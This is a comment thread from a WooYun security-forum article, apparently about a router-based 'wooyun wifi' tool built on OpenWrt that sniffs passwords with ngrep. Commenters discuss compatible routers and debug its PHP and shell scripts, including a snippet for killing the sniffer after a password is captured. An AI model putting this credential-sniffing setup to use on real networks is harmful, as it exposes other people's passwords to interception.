data-cfemail="47a1cfd6a0ddc3aec5e9a0e9f6a1dfe830222e3e2629203e22072f28332a262e2b6924282a">[email&#160;protected]</a></p><p></p></div></div><div class="note-comment"><img class="avatar" alt="30" src="http://wooyun.b0.upaiyun.com/wooyun_job/avatar/default.png"><div class="content"><div class="comment-header"><span class="author-link">小虾米</span> <span class="reply-time">2015-03-17 20:21:05</span></div><p></p><p>厉害，加油，学习了</p><p></p></div></div><div class="note-comment"><img class="avatar" alt="30" src="http://wooyun.b0.upaiyun.com/wooyun_job/avatar/default.png"><div class="content"><div class="comment-header"><span class="author-link">老板，我要捐赠</span> <span class="reply-time">2015-01-20 17:06:47</span></div><p></p><p>老板我要捐赠，快点给我卡号！我很任性！</p><p></p></div></div><div class="note-comment"><img class="avatar" alt="30" src="http://wooyun.b0.upaiyun.com/wooyun_job/avatar/default.png"><div class="content"><div class="comment-header"><span class="author-link">wang</span> <span class="reply-time">2015-01-20 11:36:02</span></div><p></p><p>更正下，是ar7240，键盘跑偏了</p><p></p></div></div><div class="note-comment"><img class="avatar" alt="30" src="http://wooyun.b0.upaiyun.com/wooyun_job/avatar/default.png"><div class="content"><div class="comment-header"><span class="author-link">wang</span> <span class="reply-time">2015-01-20 11:33:42</span></div><p></p><p>tl-tr703n用的是atheros ar7420，直接用sdk编译出来的固件大小是没问题的，但是想跑wooyunwifi估计不行，如果想更深入DIY的话，可以自行更换16M spi flash，官方有推荐：http://wiki.openwrt.org/toh/tp-link/tl-wr703n，应该可以满足你的DIY需求</p><p></p></div></div><div class="note-comment"><img class="avatar" alt="30" src="http://wooyun.b0.upaiyun.com/wooyun_job/avatar/default.png"><div class="content"><div class="comment-header"><span class="author-link">lxj616</span> <span class="reply-time">2014-11-20 17:05:46</span></div><p></p><p>openwrt支持的路由器 基本都支持，不过TL-WR703N flash可能不够大（编译完就10多M了），但是你可以自己编译一个精简版的openwrt，原理相同哦</p><p></p></div></div><div class="note-comment"><img class="avatar" alt="30" src="http://wooyun.b0.upaiyun.com/wooyun_job/avatar/default.png"><div class="content"><div class="comment-header"><span class="author-link">lxj616</span> <span class="reply-time">2014-11-20 17:01:53</span></div><p></p><p>其实设计的并不是“读到密码则停止”，只是简单的“WEB下停止ngrep和自动机运行”，当时图简单直接kill了，估计也可以用lock文件或者环境变量flag什么的，太懒，没这么写(*^__^*)</p><p></p></div></div><div class="note-comment"><img class="avatar" alt="30" src="http://wooyun.b0.upaiyun.com/wooyun_job/avatar/default.png"><div class="content"><div class="comment-header"><span class="author-link">lxj616</span> <span class="reply-time">2014-11-20 16:58:19</span></div><p></p><p>有二哥鼓励是我莫大的荣幸（默默地点击了右键-查看网页源代码……）</p><p></p></div></div><div class="note-comment"><img class="avatar" alt="30" src="http://wooyun.b0.upaiyun.com/wooyun_job/avatar/default.png"><div class="content"><div class="comment-header"><span class="author-link">lxj616</span> <span class="reply-time">2014-11-20 16:56:00</span></div><p></p><p>这只是权宜之计，在kali开发时一切都自动正常退出，但是在路由器uhttpd上发现存在这个问题，为了节省时间没有仔细追究，直接图方便强制结束了，当时想着可能和uhttpd单线程有关（ps时发现php-cgi都挂在那里不动了）</p><p></p></div></div><div class="note-comment"><img class="avatar" alt="30" src="http://wooyun.b0.upaiyun.com/wooyun_job/avatar/default.png"><div class="content"><div class="comment-header"><span class="author-link">lxj616</span> <span class="reply-time">2014-11-20 16:53:23</span></div><p></p><p>(*^__^*) 师兄过奖</p><p></p></div></div><div class="note-comment"><img class="avatar" alt="30" src="http://wooyun.b0.upaiyun.com/wooyun_job/avatar/default.png"><div class="content"><div class="comment-header"><span class="author-link">lxj616</span> <span class="reply-time">2014-11-20 16:52:13</span></div><p></p><p>共同努力创造美好明天(*^__^*)</p><p></p></div></div><div class="note-comment"><img class="avatar" alt="30" src="http://wooyun.b0.upaiyun.com/wooyun_job/avatar/default.png"><div class="content"><div class="comment-header"><span class="author-link">lxj616</span> <span class="reply-time">2014-11-20 16:46:46</span></div><p></p><p>弱用户名 top 10 ^_^</p><p></p></div></div><div class="note-comment"><img class="avatar" alt="30" src="http://wooyun.b0.upaiyun.com/wooyun_job/avatar/default.png"><div class="content"><div class="comment-header"><span class="author-link">lxj616</span> <span class="reply-time">2014-11-20 16:45:13</span></div><p></p><p>光编译Openwrt官方源码就用了一个星期~\(≧▽≦)/~，我先把水坑填平，免得后人走弯路</p><p></p></div></div><div class="note-comment"><img class="avatar" alt="30" src="http://wooyun.b0.upaiyun.com/wooyun_job/avatar/default.png"><div class="content"><div class="comment-header"><span class="author-link">lxj616</span> <span class="reply-time">2014-11-20 16:43:52</span></div><p></p><p>多谢支持O(∩_∩)O</p><p></p></div></div><div class="note-comment"><img class="avatar" alt="30" src="http://wooyun.b0.upaiyun.com/wooyun_job/avatar/default.png"><div class="content"><div class="comment-header"><span class="author-link">mhj</span> <span class="reply-time">2014-11-05 12:52:54</span></div><p></p><p>这个服了，bar都没上去？5个都是4代机吗？</p><p></p></div></div><div class="note-comment"><img class="avatar" alt="30" src="http://wooyun.b0.upaiyun.com/wooyun_job/avatar/default.png"><div class="content"><div class="comment-header"><span class="author-link">第五自由权</span> <span class="reply-time">2014-11-03 16:07:40</span></div><p></p><p>牛逼啊</p><p></p></div></div><div class="note-comment"><img class="avatar" alt="30" src="http://wooyun.b0.upaiyun.com/wooyun_job/avatar/default.png"><div class="content"><div class="comment-header"><span class="author-link">沉默</span> <span class="reply-time">2014-10-29 11:40:46</span></div><p></p><p>好评！加油！</p><p></p></div></div><div class="note-comment"><img class="avatar" alt="30" src="http://wooyun.b0.upaiyun.com/wooyun_job/avatar/default.png"><div class="content"><div class="comment-header"><span class="author-link">路西法</span> <span class="reply-time">2014-10-28 22:57:45</span></div><p></p><p>pineapple卖的就是集成。硬件价格较低，而且还是make in china（买了个五，折腾到现在都没能成功连上PC网去BAR下载各种插件）。开源了成本也就是硬件成本，但是人家卖600.有钱了才能更好的开发各种插件是不，程序员也是要养家糊口的。</p><p>最近怎么wifi这方面很火啊。</p><p></p></div></div><div class="note-comment"><img class="avatar" alt="30" src="http://wooyun.b0.upaiyun.com/wooyun_job/avatar/default.png"><div class="content"><div class="comment-header"><span class="author-link">scanf</span> <span class="reply-time">2014-10-25 09:46:58</span></div><p></p><p>不知道TP-LINK TL-WR703N能不能跑</p><p></p></div></div><div class="note-comment"><img class="avatar" alt="30" src="http://wooyun.b0.upaiyun.com/wooyun_job/avatar/default.png"><div class="content"><div class="comment-header"><span class="author-link">刘海哥</span> <span class="reply-time">2014-10-25 00:21:07</span></div><p></p><p>厉害！～</p><p></p></div></div><div class="note-comment"><img class="avatar" alt="30" src="http://wooyun.b0.upaiyun.com/wooyun_job/avatar/default.png"><div class="content"><div class="comment-header"><span class="author-link">tmp</span> <span class="reply-time">2014-10-22 15:58:44</span></div><p></p><p>在*nix下.整合自动化工具.还是用bash script比较爽</p><p></p></div></div><div class="note-comment"><img class="avatar" alt="30" src="http://wooyun.b0.upaiyun.com/wooyun_job/avatar/default.png"><div class="content"><div class="comment-header"><span class="author-link">tmp</span> <span class="reply-time">2014-10-22 15:48:18</span></div><p></p><p>shell_exec("./test2.sh ".$basepath."&amp;");<br>执行完居然不会退出? test2.sh最后面加一个exit,上面的php去掉&amp; 呢?<br>----------------------------<br>3、 自动机本身不会停止工作，必须依靠PHP+Shellscript来外部kill掉<br>这个可以在调用自动机的脚本里面处理啊.比如<br>ngrep xxx &amp; echo $! &gt; /tmp/ngrep.pid<br>然后php代码里面判断.如果获取到密码.就读ngrep.pid的值,直接kill就是了.这个不是啥大问题</p><p></p></div></div><div class="note-comment"><img class="avatar" alt="30" src="http://wooyun.b0.upaiyun.com/wooyun_job/avatar/default.png"><div class="content"><div class="comment-header"><span class="author-link">0x_Jin</span> <span class="reply-time">2014-10-22 09:48:07</span></div><p></p><p>wooyun wifi会在集市上架么</p><p></p></div></div><div class="note-comment"><img class="avatar" alt="30" src="http://wooyun.b0.upaiyun.com/wooyun_job/avatar/default.png"><div class="content"><div class="comment-header"><span class="author-link">昨日沉香</span> <span class="reply-time">2014-10-21 17:22:37</span></div><p></p><p>膜拜。。。。</p><p></p></div></div><div class="note-comment"><img class="avatar" alt="30" src="http://wooyun.b0.upaiyun.com/wooyun_job/avatar/default.png"><div class="content"><div class="comment-header"><span class="author-link">进击的zjx</span> <span class="reply-time">2014-10-20 20:58:26</span></div><p></p><p>二哥楼下好位置</p><p></p></div></div><div class="note-comment"><img class="avatar" alt="30" src="http://wooyun.b0.upaiyun.com/wooyun_job/avatar/default.png"><div class="content"><div class="comment-header"><span class="author-link">gainover</span> <span class="reply-time">2014-10-20 20:30:06</span></div><p></p><p>厉害！～</p><p></p></div></div><div class="note-comment"><img class="avatar" alt="30" src="http://wooyun.b0.upaiyun.com/wooyun_job/avatar/default.png"><div class="content"><div class="comment-header"><span class="author-link">海盗湾V</span> <span class="reply-time">2014-10-20 19:53:57</span></div><p></p><p>楼主好厉害，膜拜。</p><p></p></div></div><div class="note-comment"><img class="avatar" alt="30" src="http://wooyun.b0.upaiyun.com/wooyun_job/avatar/default.png"><div class="content"><div class="comment-header"><span class="author-link">Anymous</span> <span class="reply-time">2014-10-20 19:42:54</span></div><p></p><p>好评！加油！</p><p></p></div></div><div class="note-comment"><img class="avatar" alt="30" src="http://wooyun.b0.upaiyun.com/wooyun_job/avatar/default.png"><div class="content"><div class="comment-header"><span class="author-link">2bcoder</span> <span class="reply-time">2014-10-20 19:41:05</span></div><p></p><p>那个脚本直接后台运行 shell_exec 就退出了 ，不用强制结束 php-cgi</p><p></p></div></div><div class="note-comment"><img class="avatar" alt="30" src="http://wooyun.b0.upaiyun.com/wooyun_job/avatar/default.png"><div class="content"><div class="comment-header"><span class="author-link">人妻</span> <span class="reply-time">2014-10-20 19:08:25</span></div><p></p><p>Fate0好厉害的～</p><p></p></div></div><div class="note-comment"><img class="avatar" alt="30" src="http://wooyun.b0.upaiyun.com/wooyun_job/avatar/default.png"><div class="content"><div class="comment-header"><span class="author-link">我就是喜欢人妻</span> <span class="reply-time">2014-10-20 18:45:10</span></div><p></p><p>我就是fate0！不服咬我！！</p><p></p></div></div><div class="note-comment"><img class="avatar" alt="30" src="http://wooyun.b0.upaiyun.com/wooyun_job/avatar/default.png"><div class="content"><div class="comment-header"><span class="author-link">xiaoL</span> <span class="reply-time">2014-10-20 18:40:39</span></div><p></p><p>楼主确实进步神速，努力看齐。</p><p></p></div></div><div class="note-comment"><img class="avatar" alt="30" src="http://wooyun.b0.upaiyun.com/wooyun_job/avatar/default.png"><div class="content"><div class="comment-header"><span class="author-link">FateStayNight</span> <span class="reply-time">2014-10-20 18:07:13</span></div><p></p><p>我兄弟fate0就是这么屌，不服咬我</p><p></p></div></div><div class="note-comment"><img class="avatar" alt="30" src="http://wooyun.b0.upaiyun.com/wooyun_job/avatar/default.png"><div class="content"><div class="comment-header"><span class="author-link">人妻狂魔</span> <span class="reply-time">2014-10-20 17:58:23</span></div><p></p><p>我fate0就是那么拽</p><p></p></div></div><div class="note-comment"><img class="avatar" alt="30" src="http://wooyun.b0.upaiyun.com/wooyun_job/avatar/default.png"><div class="content"><div class="comment-header"><span class="author-link">人妻圣手</span> <span class="reply-time">2014-10-20 17:57:06</span></div><p></p><p>大家好我是fate0</p><p></p></div></div><div class="note-comment"><img class="avatar" alt="30" src="http://wooyun.b0.upaiyun.com/wooyun_job/avatar/default.png"><div class="content"><div class="comment-header"><span class="author-link">hellove</span> <span class="reply-time">2014-10-20 17:28:47</span></div><p></p><p>大家好我是fate0</p><p></p></div></div><div class="note-comment"><img class="avatar" alt="30" src="http://wooyun.b0.upaiyun.com/wooyun_job/avatar/default.png"><div class="content"><div class="comment-header"><span class="author-link">寂寞的瘦子</span> <span class="reply-time">2014-10-20 17:25:43</span></div><p></p><p>洞主进步好快，努力看齐！</p><p></p></div></div><div class="note-comment"><img class="avatar" alt="30" src="http://wooyun.b0.upaiyun.com/wooyun_job/avatar/default.png"><div class="content"><div class="comment-header"><span class="author-link">SPRITEKING</span> <span class="reply-time">2014-10-20 17:11:57</span></div><p></p><p>我叫lxj 生日是 6月16日 你猜我wooyun id 是怎么来的 楼主帅小伙 继续加油</p><p></p></div></div><div class="note-comment"><img class="avatar" alt="30" src="http://wooyun.b0.upaiyun.com/wooyun_job/avatar/default.png"><div class="content"><div class="comment-header"><span class="author-link">Mody</span> <span class="reply-time">2014-10-20 17:08:44</span></div><p></p><p>好吊阿，这不是一两天能做成的，感谢楼主</p><p></p></div></div><div class="note-comment"><img class="avatar" alt="30" src="http://wooyun.b0.upaiyun.com/wooyun_job/avatar/default.png"><div class="content"><div class="comment-header"><span class="author-link">hkAssassin</span> <span class="reply-time">2014-10-20 16:34:24</span></div><p></p><p>我叫 l x j 生日是 6月16日 你猜我wooyun id 是怎么来的###</p><p></p></div></div><div class="note-comment"><img class="avatar" alt="30" src="http://wooyun.b0.upaiyun.com/wooyun_job/avatar/default.png"><div class="content"><div class="comment-header"><span class="author-link">梧桐雨</span> <span class="reply-time">2014-10-20 16:31:38</span></div><p></p><p>全篇文章看完，楼主花了很多心思，感谢楼主的钻研精神。</p><p></p></div></div><div class="note-comment"><img class="avatar" alt="30" src="http://wooyun.b0.upaiyun.com/wooyun_job/avatar/default.png"><div class="content"><div class="comment-header"><span class="author-link">小 葛</span> <span class="reply-time">2014-10-20 15:25:11</span></div><p></p><p>6666666</p><p></p></div></div></div></div></div></main>
